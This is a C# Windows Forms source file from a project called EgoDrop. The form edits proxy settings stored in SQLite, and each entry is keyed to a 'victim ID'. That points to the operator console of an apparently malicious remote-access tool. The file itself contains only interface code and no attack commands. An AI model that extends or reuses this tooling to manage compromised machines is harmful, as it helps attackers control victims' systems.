using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmProxyEdit : Form
    {
        private frmProxy m_frmProxy { get; init; }
        private clsSqlite m_sqlite { get; init; }
        private clsSqlite.stProxy m_proxy { get; init; }
        private string m_szVictimID { get; init; }

        private bool m_bNew { get; init; }

        public frmProxyEdit(frmProxy frmProxy, clsSqlite sqlite, clsSqlite.stProxy proxy, string szVictimID)
        {
            InitializeComponent();

            m_frmProxy = frmProxy;
            m_sqlite = sqlite;
            m_proxy = proxy;
            m_szVictimID = szVictimID;

            m_bNew = false;
        }
        public frmProxyEdit(frmProxy frmProxy, clsSqlite sqlite, string szVictimID)
        {
            InitializeComponent();

            m_frmProxy = frmProxy;
            m_sqlite = sqlite;
            m_bNew = true;
        }

        void fnSave(clsSqlite.stProxy config)
        {
            if (m_sqlite.fnbSaveProxy(config))
            {
                m_frmProxy.fnLoadProxies();
                MessageBox.Show("Save proxy configuration successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Save proxy configuration failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void fnSetup()
        {
            //Controls
            if (!string.IsNullOrEmpty(m_szVictimID))
                textBox3.Text = m_szVictimID;

            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
            foreach (string szName in Enum.GetNames(typeof(clsSqlite.enProxyProtocol)))
                comboBox1.Items.Add(szName);

            comboBox1.SelectedIndex = 0;

            if (!m_bNew)
            {
                textBox1.Text = m_proxy.szName;
                numericUpDown1.Value = m_proxy.nPort;
                for (int i = 0; i < comboBox1.Items.Count; i++)
                {
                    if (string.Equals(comboBox1.Items[i], Enum.GetName(m_proxy.enProtocol)))
                    {
                        comboBox1.SelectedIndex = i;
                        break;
                    }
                }

                textBox2.Text = m_proxy.szDescription;
            }
        }

        private void frmProxyEdit_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var config = new clsSqlite.stProxy(
                textBox1.Text,
                (int)numericUpDown1.Value,
                textBox2.Text,
                (clsSqlite.enProxyProtocol)Enum.Parse(typeof(clsSqlite.enProxyProtocol), comboBox1.Text)
            );

            fnSave(config);
        }
    }
}
